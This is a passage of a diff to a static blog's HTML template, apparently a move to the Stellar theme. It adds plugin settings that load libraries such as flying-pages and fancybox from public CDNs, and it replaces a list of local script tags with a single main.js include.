+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".fancybox img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
+  }
 </script>
 
-
-
-
-
-
-
-<script src="/js/tools/imageViewer.js" type="module"></script>
-
-<script src="/js/utils.js" type="module"></script>
-
-<script src="/js/main.js" type="module"></script>
-
-<script src="/js/layouts/navbarShrink.js" type="module"></script>
-
-<script src="/js/tools/scrollTopBottom.js" type="module"></script>
-
-<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
-
-<script src="/js/layouts/categoryList.js" type="module"></script>
-
-
-
-
-
-    
-<script src="/js/tools/codeBlock.js" type="module"></script>
-
-
-
-
-    
-<script src="/js/layouts/lazyload.js" type="module"></script>
-
-
-
-
-    
-<script src="/js/tools/runtime.js"></script>
-
-    
-<script src="/js/libs/odometer.min.js"></script>
-
-    
-<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
-
-
-
+<!-- required -->
 
   
-<script src="/js/libs/Typed.min.js"></script>
-
-  
-<script src="/js/plugins/typed.js" type="module"></script>
+<script src="/js/main.js" async></script>
 
 
 
+<!-- optional -->
 
 
 
 
 
 
-<div class="post-scripts" data-swup-reload-script>
-    
-        
-<script src="/js/tools/tocToggle.js" type="module"></script>
-
-<script src="/js/layouts/toc.js" type="module"></script>
-
-<script src="/js/plugins/tabs.js" type="module"></script>
-
-    
-</div>
+<!-- inject -->
 
 
+  </div>
 </body>
 </html>
